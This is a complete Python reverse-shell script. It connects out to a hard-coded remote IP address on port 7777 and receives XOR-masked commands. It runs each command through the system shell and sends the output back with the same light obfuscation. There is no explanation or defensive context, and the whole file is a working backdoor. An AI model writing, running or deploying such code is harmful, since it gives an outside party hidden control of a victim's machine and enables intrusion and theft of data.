#!/usr/bin/env python3
# -*- coding:utf-8 -*-
# Author:Ameng, jlx-love.com
from socket import *
import subprocess
import struct

server = socket(AF_INET,SOCK_STREAM)
server.connect(('95.179.187.132',7777))
def encrypt(data):
    data = bytearray(data)
    for i in range(len(data)):
        data[i] ^= 0x23
    return data


def decrypt(data):
    data = bytearray(data)
    for i in range(len(data)):
        data[i] ^= 0x23
    return data

while True:
    try:
        cmd = server.recv(1024)
        cmd = decrypt(cmd)
        if len(cmd) == 0:
            break
        res = subprocess.Popen(cmd.decode('utf-8'),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        stdout_res = res.stdout.read()
        stderr_res = res.stderr.read()
        result = stdout_res + stderr_res
        result = encrypt(result)
        total_size = len(result)
        header = struct.pack('i',total_size)
        server.send(header)
        server.send(result)
    except Exception:
        break
server.close()
